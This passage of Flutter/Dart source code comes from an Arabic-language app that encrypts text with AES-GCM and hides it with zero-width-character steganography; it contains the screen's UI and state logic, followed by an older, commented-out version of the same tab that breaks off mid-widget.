      state = state.copyWith(
        outputText:
            "❌ خطأ: فشل فك التشفير. كلمة المرور خاطئة أو البيانات تالفة.",
        isLoading: false,
      );
    } catch (e, stackTrace) {
      _logger.error("performOperation", "Operation Error", e, stackTrace);
      state = state.copyWith(
        outputText: "❌ خطأ: ${e.toString().replaceFirst("Exception: ", "")}",
        isLoading: false,
      );
    }
  }
}

// encryptionScreenProvider (يستخدم Providers المُعدّلة)
final encryptionScreenProvider =
    StateNotifierProvider<EncryptionNotifier, EncryptionState>((ref) {
  return EncryptionNotifier(
    ref.watch(aesGcmServiceProvider),
    ref.watch(zeroWidthServiceProvider),
    ref.watch(historyServiceProvider), // سيحصل على النسخة الصحيحة
    ref.watch(appLoggerProvider),
  );
});

// class EncryptionScreen (Widget - كما هي من قبل)
class EncryptionScreen extends ConsumerWidget {
  const EncryptionScreen({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    // ... (الكود الخاص بالـ UI لا يتغير هنا)
    // يمكنك استخدام نفس الكود الذي قدمته في الأسئلة السابقة لجزء الواجهة (build method)
    // سأقوم بإعادة لصق الكود الخاص بالواجهة من رد سابق للكمال:
    final state = ref.watch(encryptionScreenProvider);
    final notifier = ref.read(encryptionScreenProvider.notifier);
    final theme = Theme.of(context);

    bool showCoverInput = state.operationMode == OperationMode.hide ||
        state.operationMode == OperationMode.encryptAndHide;
    bool showPasswordInputAndSwitch = state.usePassword;

    String secretInputLabel = 'النص الأصلي لإدخاله';
    String secretInputHint = 'أدخل النص هنا...';
    if (state.operationMode == OperationMode.decrypt ||
        state.operationMode == OperationMode.reveal ||
        state.operationMode == OperationMode.revealAndDecrypt) {
      secretInputLabel = 'النص المُدخل (المشفر أو المخفي)';
      secretInputHint = 'الصق النص هنا...';
    }

    return Directionality(
      textDirection: TextDirection.rtl,
      child: Scaffold(
        body: SingleChildScrollView(
          padding: const EdgeInsets.all(16),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildOperationModeSelector(context, state, notifier),
              const SizedBox(height: 16),
              Card(
                elevation: 2,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12)),
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        secretInputLabel,
                        style: GoogleFonts.cairo(
                            textStyle: theme.textTheme.titleMedium
                                ?.copyWith(fontWeight: FontWeight.w600)),
                      ),
                      const SizedBox(height: 8),
                      TextField(
                        controller: TextEditingController(
                            text: state.secretInput)
                          ..selection = TextSelection.fromPosition(
                              TextPosition(offset: state.secretInput.length)),
                        onChanged: notifier.updateSecretInput,
                        style: GoogleFonts.cairo(fontSize: 15),
                        maxLines: 4,
                        minLines: 2,
                        decoration: InputDecoration(
                          hintText: secretInputHint,
                          hintStyle: GoogleFonts.cairo(color: Colors.grey[500]),
                          prefixIcon: Icon(
                              state.operationMode == OperationMode.decrypt ||
                                      state.operationMode ==
                                          OperationMode.reveal ||
                                      state.operationMode ==
                                          OperationMode.revealAndDecrypt
                                  ? Icons.lock_open_rounded
                                  : Icons.edit_document,
                              color: theme.iconTheme.color?.withOpacity(0.7)),
                          border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(8)),
                        ),
                      ),
                      if (showCoverInput) ...[
                        const SizedBox(height: 16),
                        Text(
                          'نص الغطاء (للإخفاء ضمنه)',
                          style: GoogleFonts.cairo(
                              textStyle: theme.textTheme.titleMedium
                                  ?.copyWith(fontWeight: FontWeight.w600)),
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          controller: TextEditingController(
                              text: state.coverInput)
                            ..selection = TextSelection.fromPosition(
                                TextPosition(offset: state.coverInput.length)),
                          onChanged: notifier.updateCoverInput,
                          style: GoogleFonts.cairo(fontSize: 15),
                          maxLines: 3,
                          minLines: 1,
                          decoration: InputDecoration(
                            hintText:
                                'أدخل نص الغطاء الظاهر الذي سيتم إخفاء البيانات بداخله...',
                            hintStyle:
                                GoogleFonts.cairo(color: Colors.grey[500]),
                            prefixIcon: Icon(Icons.text_snippet_outlined,
                                color: theme.iconTheme.color?.withOpacity(0.7)),
                            border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(8)),
                          ),
                        ),
                      ],
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 16),
              if (showPasswordInputAndSwitch)
                Card(
                  elevation: 2,
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                  child: Theme(
                    data: theme.copyWith(dividerColor: Colors.transparent),
                    child: ExpansionTile(
                      key: const ValueKey('encryption_settings_tile'),
                      initiallyExpanded: true,
                      leading:
                          Icon(Icons.key_outlined, color: theme.primaryColor),
                      title: Text('إعدادات كلمة المرور (AES-GCM)',
                          style: GoogleFonts.cairo(
                              textStyle: theme.textTheme.titleMedium
                                  ?.copyWith(fontWeight: FontWeight.w600))),
                      children: [
                        Padding(
                          padding:
                              const EdgeInsets.fromLTRB(16.0, 0, 16.0, 16.0),
                          child: TextField(
                            controller:
                                TextEditingController(text: state.passwordInput)
                                  ..selection = TextSelection.fromPosition(
                                      TextPosition(
                                          offset: state.passwordInput.length)),
                            onChanged: notifier.updatePasswordInput,
                            obscureText: !state.isPasswordVisible,
                            style: GoogleFonts.cairo(
                                fontSize: 16, letterSpacing: 1),
                            decoration: InputDecoration(
                              labelText: 'كلمة المرور',
                              labelStyle: GoogleFonts.cairo(),
                              hintText: 'أدخل كلمة مرور قوية هنا',
                              hintStyle:
                                  GoogleFonts.cairo(color: Colors.grey[500]),
                              suffixIcon: IconButton(
                                icon: Icon(
                                    state.isPasswordVisible
                                        ? Icons.visibility_off_outlined
                                        : Icons.visibility_outlined,
                                    color: theme.iconTheme.color
                                        ?.withOpacity(0.7)),
                                onPressed: notifier.togglePasswordVisibility,
                              ),
                              border: OutlineInputBorder(
                                  borderRadius: BorderRadius.circular(8)),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              const SizedBox(height: 24),
              ElevatedButton.icon(
                icon: state.isLoading
                    ? const SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(
                            strokeWidth: 3, color: Colors.white))
                    : _getOperationIconWidget(state.operationMode),
                label: Text(
                  state.isLoading
                      ? 'جاري المعالجة...'
                      : _getOperationButtonText(state.operationMode),
                  style: GoogleFonts.cairo(
                      fontWeight: FontWeight.bold, fontSize: 16),
                ),
                onPressed: state.isLoading
                    ? null
                    : () async {
                        FocusScope.of(context).unfocus();
                        await notifier.performOperation();
                        if (!context.mounted) return;

                        final currentState = ref.read(encryptionScreenProvider);
                        if (!currentState.isLoading &&
                            (currentState.outputText.isNotEmpty &&
                                !currentState.outputText.startsWith('❌'))) {
                          ScaffoldMessenger.of(context).showSnackBar(
                            SnackBar(
                                content: Text('✅ تمت العملية بنجاح!',
                                    style: GoogleFonts.cairo()),
                                behavior: SnackBarBehavior.floating,
                                backgroundColor: Colors.green[700],
                                duration: const Duration(seconds: 2)),
                          );
                        } else if (currentState.outputText.startsWith('❌')) {
                          showDialog(
                            context: context,
                            builder: (ctx) => AlertDialog(
                              title: Text('حدث خطأ في العملية',
                                  style: GoogleFonts.cairo()),
                              content: Text(
                                  currentState.outputText.substring(2),
                                  style: GoogleFonts.cairo()),
                              actions: [
                                TextButton(
                                  onPressed: () => Navigator.of(ctx).pop(),
                                  child: Text('حسنًا',
                                      style: GoogleFonts.cairo(
                                          color: theme.primaryColor)),
                                ),
                              ],
                            ),
                          );
                        }
                      },
                style: ElevatedButton.styleFrom(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10)),
                  elevation: 3,
                  backgroundColor: theme.primaryColor,
                  foregroundColor: Colors.white,
                ),
              ),
              const SizedBox(height: 16),
              if (state.outputText.isNotEmpty)
                Card(
                  elevation: 2,
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                  color: state.outputText.startsWith('❌')
                      ? Colors.red.withOpacity(0.05)
                      : theme.colorScheme.surfaceContainerHighest
                          .withOpacity(0.5),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Text(
                              state.outputText.startsWith('❌')
                                  ? 'رسالة خطأ'
                                  : 'النتيجة',
                              style: GoogleFonts.cairo(
                                textStyle:
                                    theme.textTheme.titleMedium?.copyWith(
                                  fontWeight: FontWeight.w600,
                                  color: state.outputText.startsWith('❌')
                                      ? Colors.red.shade700
                                      : theme.textTheme.titleMedium?.color,
                                ),
                              ),
                            ),
                            if (!state.outputText.startsWith('❌'))
                              Row(
                                children: [
                                  IconButton(
                                    icon: const Icon(Icons.copy_all_outlined,
                                        size: 22),
                                    tooltip: 'نسخ النتيجة',
                                    color:
                                        theme.iconTheme.color?.withOpacity(0.8),
                                    onPressed: () {
                                      Clipboard.setData(ClipboardData(
                                          text: state.outputText));
                                      if (!context.mounted) return;
                                      ScaffoldMessenger.of(context)
                                          .showSnackBar(
                                        SnackBar(
                                            content: Text(
                                                '✅ تم نسخ النتيجة إلى الحافظة.',
                                                style: GoogleFonts.cairo()),
                                            behavior: SnackBarBehavior.floating,
                                            backgroundColor: Colors.green[700],
                                            duration:
                                                const Duration(seconds: 2)),
                                      );
                                    },
                                  ),
                                  IconButton(
                                    icon: const Icon(Icons.share_outlined,
                                        size: 22),
                                    tooltip: 'مشاركة النتيجة',
                                    color:
                                        theme.iconTheme.color?.withOpacity(0.8),
                                    onPressed: () {
                                      Share.share(state.outputText);
                                    },
                                  ),
                                ],
                              ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        SelectableText(
                          state.outputText.startsWith('❌')
                              ? state.outputText.substring(2)
                              : state.outputText,
                          style: GoogleFonts.cairo(
                            textStyle: TextStyle(
                              fontSize: 14.5,
                              color: state.outputText.startsWith('❌')
                                  ? Colors.red.shade800
                                  : theme.textTheme.bodyMedium?.color,
                              height: 1.6,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              const SizedBox(height: 10),
              TextButton.icon(
                icon: const Icon(Icons.refresh_rounded, size: 20),
                label: Text("إعادة تعيين الحقول", style: GoogleFonts.cairo()),
                onPressed: notifier.resetFields,
                style: TextButton.styleFrom(foregroundColor: Colors.grey[600]),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ... (دوال الواجهة المساعدة: _getOperationButtonText, _getOperationIconWidget, etc. كما هي)
  String _getOperationButtonText(OperationMode mode) {
    switch (mode) {
      case OperationMode.encrypt:
        return 'تشفير النص';
      case OperationMode.decrypt:
        return 'فك تشفير النص';
      case OperationMode.hide:
        return 'إخفاء النص';
      case OperationMode.reveal:
        return 'كشف النص';
      case OperationMode.encryptAndHide:
        return 'تشفير ثم إخفاء';
      case OperationMode.revealAndDecrypt:
        return 'كشف ثم فك تشفير';
    }
  }

  Widget _getOperationIconWidget(OperationMode mode) {
    switch (mode) {
      case OperationMode.encrypt:
        return const Icon(Icons.enhanced_encryption_rounded);
      case OperationMode.decrypt:
        return const Icon(Icons.lock_open_rounded);
      case OperationMode.hide:
        return const Icon(Icons.visibility_off_rounded);
      case OperationMode.reveal:
        return const Icon(Icons.visibility_rounded);
      case OperationMode.encryptAndHide:
        return const Icon(Icons.shield_moon_rounded);
      case OperationMode.revealAndDecrypt:
        return const Icon(Icons.key_rounded);
    }
  }

  Widget _buildOperationModeSelector(BuildContext context,
      EncryptionState state, EncryptionNotifier notifier) {
    final theme = Theme.of(context);
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          'اختر العملية المطلوبة:',
          style: GoogleFonts.cairo(
              textStyle: theme.textTheme.titleSmall?.copyWith(
                  fontWeight: FontWeight.w600,
                  color: theme.colorScheme.onSurfaceVariant)),
        ),
        const SizedBox(height: 8),
        DropdownButtonFormField<OperationMode>(
          value: state.operationMode,
          style: GoogleFonts.cairo(
              color: theme.textTheme.bodyLarge?.color, fontSize: 15),
          decoration: InputDecoration(
            prefixIcon: Icon(Icons.tune_outlined,
                color: theme.iconTheme.color?.withOpacity(0.7)),
            contentPadding:
                const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            fillColor:
                theme.colorScheme.surfaceContainerHighest.withOpacity(0.5),
            filled: true,
            border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(8),
                borderSide: BorderSide.none),
          ),
          isExpanded: true,
          icon: Icon(Icons.arrow_drop_down_circle_outlined,
              color: theme.iconTheme.color?.withOpacity(0.7)),
          dropdownColor: theme.cardColor,
          items: OperationMode.values.map((OperationMode mode) {
            return DropdownMenuItem<OperationMode>(
              value: mode,
              child:
                  Text(_getOperationMenuText(mode), style: GoogleFonts.cairo()),
            );
          }).toList(),
          onChanged: (OperationMode? newValue) {
            if (newValue != null) {
              notifier.setOperationMode(newValue);
            }
          },
        ),
      ],
    );
  }

  String _getOperationMenuText(OperationMode mode) {
    switch (mode) {
      case OperationMode.encrypt:
        return 'تشفير (AES-GCM)';
      case OperationMode.decrypt:
        return 'فك تشفير (AES-GCM)';
      case OperationMode.hide:
        return 'إخفاء (Zero-Width)';
      case OperationMode.reveal:
        return 'كشف (Zero-Width)';
      case OperationMode.encryptAndHide:
        return 'تشفير ثم إخفاء';
      case OperationMode.revealAndDecrypt:
        return 'كشف ثم فك تشفير';
    }
  }
}



// ------------------------------ نهاية الملف: encryption_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: encryption_tab.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\encryption_tab\encryption_tab.dart
// ----------------------------------------------------------------------

// import 'dart:async'; // Added for Timer (clipboard clearing)

// import 'package:cryptography/cryptography.dart'; // Import for SecretBoxAuthenticationError
// import 'package:flutter/material.dart';
// import 'package:flutter/services.dart';
// import 'package:flutter_riverpod/flutter_riverpod.dart';
// import 'package:google_fonts/google_fonts.dart'; // Use Google Fonts
// import 'package:share_plus/share_plus.dart';

// // Import centralized providers
// import '../../core/encryption/aes_gcm_service.dart';
// import '../../core/history/history_item.dart';
// import '../../core/history/history_service.dart';
// import '../../core/steganography/zero_width_service.dart';

// // Provider for ZeroWidthService (keep here if only used in this tab, or centralize if used elsewhere)
// final zeroWidthServiceProvider = Provider((ref) => ZeroWidthService());

// // Enum for the selected operation mode
// enum OperationMode {
//   encrypt,
//   decrypt,
//   hide,
//   reveal,
//   encryptAndHide,
//   revealAndDecrypt
// }

// // StateNotifier for the Encryption Tab's state
// class EncryptionState {
//   final String secretInput;
//   final String coverInput;
//   final String passwordInput;
//   final String outputText;
//   final bool isLoading;
//   final bool usePassword;
//   final bool isPasswordVisible;
//   final OperationMode operationMode;
//   final bool useSteganography;

//   EncryptionState({
//     this.secretInput = '',
//     this.coverInput = '',
//     this.passwordInput = '',
//     this.outputText = '',
//     this.isLoading = false,
//     this.usePassword = true, // Default to using password for encryption
//     this.isPasswordVisible = false,
//     this.operationMode = OperationMode.encrypt, // Default mode
//     this.useSteganography = false, // Default to not using steganography
//   });

//   EncryptionState copyWith({
//     String? secretInput,
//     String? coverInput,
//     String? passwordInput,
//     String? outputText,
//     bool? isLoading,
//     bool? usePassword,
//     bool? isPasswordVisible,
//     OperationMode? operationMode,
//     bool? useSteganography,
//   }) {
//     return EncryptionState(
//       secretInput: secretInput ?? this.secretInput,
//       coverInput: coverInput ?? this.coverInput,
//       passwordInput: passwordInput ?? this.passwordInput,
//       outputText: outputText ?? this.outputText,
//       isLoading: isLoading ?? this.isLoading,
//       usePassword: usePassword ?? this.usePassword,
//       isPasswordVisible: isPasswordVisible ?? this.isPasswordVisible,
//       operationMode: operationMode ?? this.operationMode,
//       useSteganography: useSteganography ?? this.useSteganography,
//     );
//   }
// }

// class EncryptionNotifier extends StateNotifier<EncryptionState> {
//   final AesGcmService _aesService;
//   final ZeroWidthService _zwService;
//   final HistoryService _historyService;

//   EncryptionNotifier(this._aesService, this._zwService, this._historyService)
//       : super(EncryptionState());

//   // Update input fields
//   void updateSecretInput(String value) =>
//       state = state.copyWith(secretInput: value);
//   void updateCoverInput(String value) =>
//       state = state.copyWith(coverInput: value);
//   void updatePasswordInput(String value) =>
//       state = state.copyWith(passwordInput: value);

//   // Toggle password visibility
//   void togglePasswordVisibility() =>
//       state = state.copyWith(isPasswordVisible: !state.isPasswordVisible);

//   // Toggle password usage
//   void toggleUsePassword(bool value) =>
//       state = state.copyWith(usePassword: value);

//   // Toggle steganography usage
//   void toggleUseSteganography(bool value) =>
//       state = state.copyWith(useSteganography: value);

//   // Change operation mode
//   void setOperationMode(OperationMode mode) =>
//       state = state.copyWith(operationMode: mode);

//   // Reset fields
//   void resetFields() {
//     state = state.copyWith(
//       secretInput: '',
//       coverInput: '',
//       passwordInput: '',
//       outputText: '',
//       isLoading: false,
//     );
//   }

//   // Perform the selected operation
//   Future<void> performOperation() async {
//     state = state.copyWith(isLoading: true, outputText: '');
//     String result = '';
//     OperationType historyOpType = OperationType.encryptAes; // Default
//     String historyInput = state.secretInput;
//     String? historyCover = state.coverInput;
//     bool historyUsedPassword = state.usePassword;
//     bool historyUsedStego = state.useSteganography;

//     try {
//       final secret = state.secretInput.trim();
//       final cover = state.coverInput.trim();
//       final password =
//           state.passwordInput; // No trim, spaces might be intentional

//       // Input validation
//       if (secret.isEmpty) {
//         throw Exception('يرجى إدخال النص المطلوب.');
//       }
//       if (state.usePassword &&
//           password.isEmpty &&
//           (state.operationMode == OperationMode.encrypt ||
//               state.operationMode == OperationMode.decrypt ||
//               state.operationMode == OperationMode.encryptAndHide ||
//               state.operationMode == OperationMode.revealAndDecrypt)) {
//         throw Exception('كلمة المرور مطلوبة لهذه العملية.');
//       }
//       if (state.useSteganography &&
//           cover.isEmpty &&
//           (state.operationMode == OperationMode.hide ||
//               state.operationMode == OperationMode.encryptAndHide)) {
//         throw Exception('نص الغطاء مطلوب عند استخدام الإخفاء.');
//       }

//       switch (state.operationMode) {
//         case OperationMode.encrypt:
//           historyOpType = OperationType.encryptAes;
//           result = await _aesService.encryptWithPassword(secret, password);
//           break;
//         case OperationMode.decrypt:
//           historyOpType = OperationType.decryptAes;
//           result = await _aesService.decryptWithPassword(secret, password);
//           break;
//         case OperationMode.hide:
//           historyOpType = OperationType.encodeZeroWidth;
//           final zeroWidth = _zwService.encode(secret);
//           result = _zwService.hideInCoverText(cover, zeroWidth);
//           historyUsedPassword = false; // No password for pure stego
//           break;
//         case OperationMode.reveal:
//           historyOpType = OperationType.decodeZeroWidth;
//           result = _zwService.extractFromText(secret);
//           historyUsedPassword = false;
//           break;
//         case OperationMode.encryptAndHide:
//           historyOpType = OperationType.encryptThenHide;
//           final encrypted =
//               await _aesService.encryptWithPassword(secret, password);
//           final zeroWidth = _zwService.encode(encrypted);
//           result = _zwService.hideInCoverText(cover, zeroWidth);
//           break;
//         case OperationMode.revealAndDecrypt:
//           historyOpType = OperationType.revealThenDecrypt;
//           final extracted = _zwService.extractFromText(secret);
//           result = await _aesService.decryptWithPassword(extracted, password);
//           break;
//       }

//       state = state.copyWith(outputText: result, isLoading: false);

//       // Add to history
//       await _historyService.addHistoryItem(HistoryItem(
//         id: DateTime.now().millisecondsSinceEpoch.toString(),
//         timestamp: DateTime.now(),
//         operationType: historyOpType,
//         originalInput: historyInput,
//         coverText: historyCover,
//         output: result,
//         usedPassword: historyUsedPassword,
//         usedSteganography: historyUsedStego,
//       ));
//     } on SecretBoxAuthenticationError {
//       print(
//           "Operation Error: Authentication failed (wrong password or data tampered)");
//       state = state.copyWith(
//         outputText:
//             "❌ خطأ: فشل فك التشفير. كلمة المرور خاطئة أو البيانات تالفة.",
//         isLoading: false,
//       );
//       throw Exception("Decryption failed: Wrong password or data corrupted.");
//     } catch (e) {
//       print("Operation Error: $e");
//       state = state.copyWith(
//         outputText: "❌ خطأ: ${e.toString().replaceFirst("Exception: ", "")}",
//         isLoading: false,
//       );
//       throw Exception(e.toString().replaceFirst("Exception: ", ""));
//     }
//   }
// }

// // Provider for the EncryptionNotifier
// final encryptionProvider =
//     StateNotifierProvider<EncryptionNotifier, EncryptionState>((ref) {
//   return EncryptionNotifier(
//     ref.watch(aesGcmServiceProvider), // Use centralized provider
//     ref.watch(zeroWidthServiceProvider),
//     ref.watch(historyServiceProvider), // Use centralized provider
//   );
// });

// class EncryptionTab extends ConsumerWidget {
//   const EncryptionTab({super.key});

//   @override
//   Widget build(BuildContext context, WidgetRef ref) {
//     final state = ref.watch(encryptionProvider);
//     final notifier = ref.read(encryptionProvider.notifier);
//     final isDark = Theme.of(context).brightness == Brightness.dark;
//     final theme = Theme.of(context);

//     // Determine which fields are visible based on the operation mode
//     bool showSecretInput = true; // Always shown, label changes
//     bool showCoverInput = state.operationMode == OperationMode.hide ||
//         state.operationMode == OperationMode.encryptAndHide;
//     bool showPasswordInput = state.usePassword &&
//         (state.operationMode == OperationMode.encrypt ||
//             state.operationMode == OperationMode.decrypt ||
//             state.operationMode == OperationMode.encryptAndHide ||
//             state.operationMode == OperationMode.revealAndDecrypt);
//     bool showUsePasswordSwitch = state.operationMode == OperationMode.encrypt ||
//         state.operationMode == OperationMode.decrypt ||
//         state.operationMode == OperationMode.encryptAndHide ||
//         state.operationMode == OperationMode.revealAndDecrypt;
//     bool showUseStegoSwitch = state.operationMode == OperationMode.encrypt ||
//         state.operationMode == OperationMode.hide ||
//         state.operationMode == OperationMode.encryptAndHide;

//     String secretInputLabel = 'النص الأصلي';
//     String secretInputHint = 'أدخل النص هنا...';
//     if (state.operationMode == OperationMode.decrypt ||
//         state.operationMode == OperationMode.reveal ||
//         state.operationMode == OperationMode.revealAndDecrypt) {
//       secretInputLabel = 'النص المُدخل (المشفر أو المخفي)';
//       secretInputHint = 'الصق النص هنا...';
//     }

//     return Directionality(
//       textDirection: TextDirection.rtl,
//       child: SingleChildScrollView(
//         padding: const EdgeInsets.all(16),
//         child: Column(
//           crossAxisAlignment: CrossAxisAlignment.stretch,
//           children: [
//             // Operation Mode Selection
//             _buildOperationModeSelector(context, state, notifier),
//             const SizedBox(height: 16),

//             // Input Card
//             Card(
//               child: Padding(
//                 padding: const EdgeInsets.all(16.0),
//                 child: Column(
//                   crossAxisAlignment: CrossAxisAlignment.start,
//                   children: [
//                     Text(
//                       secretInputLabel,
//                       style: GoogleFonts.cairo(
//                         // Apply Cairo font
//                         textStyle: theme.textTheme.titleMedium
//                             ?.copyWith(fontWeight: FontWeight.bold),
//                       ),
//                     ),
//                     const SizedBox(height: 8),
//                     TextField(
//                       controller: TextEditingController(text: state.secretInput)
//                         ..selection = TextSelection.fromPosition(
//                             TextPosition(offset: state.secretInput.length)),
//                       onChanged: notifier.updateSecretInput,
//                       style: GoogleFonts.cairo(), // Apply Cairo font
//                       maxLines: 4,
//                       decoration: InputDecoration(
//                         hintText: secretInputHint,
//                         hintStyle: GoogleFonts.cairo(), // Apply Cairo font
//                         prefixIcon: Icon(state.operationMode ==
//                                     OperationMode.decrypt ||
//                                 state.operationMode == OperationMode.reveal ||
//                                 state.operationMode ==
//                                     OperationMode.revealAndDecrypt
//                             ? Icons.lock_open_outlined
//                             : Icons.edit_note_outlined),
//                       ),
//                     ),
//                     if (showCoverInput) ...[
//                       const SizedBox(height: 16),
//                       Text(
//                         'نص الغطاء (للإخفاء)',
//                         style: GoogleFonts.cairo(
//                           // Apply Cairo font
//                           textStyle: theme.textTheme.titleMedium
//                               ?.copyWith(fontWeight: FontWeight.bold),
//                         ),
//                       ),
//                       const SizedBox(height: 8),
//                       TextField(
//                         controller: TextEditingController(
//                             text: state.coverInput)
//                           ..selection = TextSelection.fromPosition(
//                               TextPosition(offset: state.coverInput.length)),
//                         onChanged: notifier.updateCoverInput,
//                         style: GoogleFonts.cairo(), // Apply Cairo font
//                         decoration: InputDecoration(
//                           hintText: 'أدخل نص الغطاء الظاهر...',
//                           hintStyle: GoogleFonts.cairo(), // Apply Cairo font
//                           prefixIcon: const Icon(Icons.text_fields_outlined),
//                         ),
//                       ),
//                     ],
//                   ],
//                 ),
//               ),
//             ),
//             const SizedBox(height: 16),

//             // Settings Card
//             Card(
//               child: Theme(
//                 data: theme.copyWith(
//                     dividerColor:
//                         Colors.transparent), // Hide divider in ExpansionTile
//                 child: ExpansionTile(
//                   initiallyExpanded: showPasswordInput ||
//                       showUsePasswordSwitch ||
//                       showUseStegoSwitch,
//                   leading:
//                       Icon(Icons.settings_outlined, color: theme.primaryColor),
//                   title: Text('الإعدادات المتقدمة',
//                       style: GoogleFonts.cairo(
//                           // Apply Cairo font
//                           textStyle: theme.textTheme.titleMedium
//                               ?.copyWith(fontWeight: FontWeight.bold))),
//                   children: [
//                     Padding(
//                       padding: const EdgeInsets.symmetric(
//                           horizontal: 16.0, vertical: 8.0),
//                       child: Column(
//                         children: [
//                           if (showUsePasswordSwitch)
//                             SwitchListTile(
//                               title: Text('استخدام كلمة مرور (AES-GCM)',
//                                   style:
//                                       GoogleFonts.cairo()), // Apply Cairo font
//                               subtitle: Text('مُوصى به للتشفير القوي',
//                                   style:
//                                       GoogleFonts.cairo()), // Apply Cairo font
//                               value: state.usePassword,
//                               onChanged: notifier.toggleUsePassword,
//                               activeColor: theme.primaryColor,
//                               dense: true,
//                               contentPadding: EdgeInsets.zero,
//                             ),
//                           if (showPasswordInput) ...[
//                             const SizedBox(height: 8),
//                             TextField(
//                               controller: TextEditingController(
//                                   text: state.passwordInput)
//                                 ..selection = TextSelection.fromPosition(
//                                     TextPosition(
//                                         offset: state.passwordInput.length)),
//                               onChanged: notifier.updatePasswordInput,
//                               obscureText: !state.isPasswordVisible,
//                               style: GoogleFonts.cairo(), // Apply Cairo font
//                               decoration: InputDecoration(
//                                 labelText: 'كلمة المرور',
//                                 labelStyle:
//                                     GoogleFonts.cairo(), // Apply Cairo font
//                                 prefixIcon: const Icon(Icons.password_outlined),
//                                 suffixIcon: IconButton(
//                                   icon: Icon(state.isPasswordVisible
//                                       ? Icons.visibility_off_outlined
//                                       : Icons.visibility_outlined),
//                                   onPressed: notifier.togglePasswordVisibility,
//                                 ),
//                               ),
//                             ),
//                             const SizedBox(height: 8),
//                             // Password Strength Checker (ensure it's compatible and styled)
//                             // PasswordStrengthChecker(
//                             //   passwordValue: state.passwordInput,
//                             //   strength: PasswordStrength.medium,
//                             // ),
//                           ],
//                           if (showUseStegoSwitch)
//                             SwitchListTile(
//                               title: Text('إخفاء باستخدام Zero-Width',
//                                   style:
//                                       GoogleFonts.cairo()), // Apply Cairo font
//                               subtitle: Text(
//                                   'إخفاء النص (أقل أمانًا من التشفير)',
//                                   style:
//                                       GoogleFonts.cairo()), // Apply Cairo font
//                               value: state.useSteganography,
//                               onChanged: notifier.toggleUseSteganography,
//                               activeColor: theme.primaryColor,
//                               dense: true,
//                               contentPadding: EdgeInsets.zero,
//                             ),
//                         ],
//                       ),
//                     ),
//                   ],
//                 ),
//               ),
//             ),
//             const SizedBox(height: 24),

//             // Action Button
//             ElevatedButton.icon(
//               icon: state.isLoading
//                   ? const SizedBox(
//                       width: 20,
//                       height: 20,
//                       child: CircularProgressIndicator(
//                           strokeWidth: 2, color: Colors.white))
//                   : _getOperationIcon(state.operationMode),
//               label: Text(
//                 state.isLoading
//                     ? 'جاري المعالجة...'
//                     : _getOperationButtonText(state.operationMode),
//                 style: GoogleFonts.cairo(
//                     fontWeight: FontWeight.bold), // Apply Cairo font
//               ),
//               onPressed: state.isLoading
//                   ? null
//                   : () async {
//                       try {
//                         await notifier.performOperation();
//                         // Show success message via SnackBar
//                         if (context.mounted &&
//                             !state.isLoading &&
//                             !state.outputText.startsWith('❌')) {
//                           ScaffoldMessenger.of(context).showSnackBar(
//                             SnackBar(
//                                 content: Text('✅ تمت العملية بنجاح!',
//                                     style: GoogleFonts.cairo()),
//                                 duration: const Duration(seconds: 3)),
//                           );
//                         }
//                       } catch (e) {
//                         // Show error dialog
//                         if (context.mounted) {
//                           showDialog(
//                             context: context,
//                             builder: (context) => AlertDialog(
//                               title: Text('حدث خطأ',
//                                   style:
//                                       GoogleFonts.cairo()), // Apply Cairo font
//                               content: Text(e.toString(),
//                                   style:
//                                       GoogleFonts.cairo()), // Apply Cairo font
//                               actions: [
//                                 TextButton(
//                                   onPressed: () => Navigator.pop(context),
//                                   child: Text('حسنًا',
//                                       style: GoogleFonts
//                                           .cairo()), // Apply Cairo font
//                                 ),
//                               ],
//                             ),
//                           );
//                         }
//                       }
//                     },
//               style: ElevatedButton.styleFrom(
//                 padding: const EdgeInsets.symmetric(vertical: 14),
//               ),
//             ),
//             const SizedBox(height: 16),

//             // Output Card
//             if (state.outputText.isNotEmpty)
//               Card(
//                 color: state.outputText.startsWith('❌')
//                     ? Colors.red.shade50
//                     : (isDark ? theme.colorScheme.surface : Colors.grey[50]),
//                 child: Padding(
//                   padding: const EdgeInsets.all(16.0),
//                   child: Column(
//                     crossAxisAlignment: CrossAxisAlignment.start,
//                     children: [
//                       Row(
//                         mainAxisAlignment: MainAxisAlignment.spaceBetween,
//                         children: [
//                           Text(
//                             state.outputText.startsWith('❌')
//                                 ? 'رسالة خطأ'
//                                 : 'النتيجة',
//                             style: GoogleFonts.cairo(
//                               // Apply Cairo font
//                               textStyle: theme.textTheme.titleMedium?.copyWith(
//                                 fontWeight: FontWeight.bold,
//                                 color: state.outputText.startsWith('❌')
//                                     ? Colors.red.shade700
//                                     : theme.textTheme.titleMedium?.color,
//                               ),
//                             ),
//                           ),
//                           if (!state.outputText.startsWith('❌'))
//                             Row(
//                               children: [
//                                 IconButton(
//                                   icon:
//                                       const Icon(Icons.copy_outlined, size: 20),
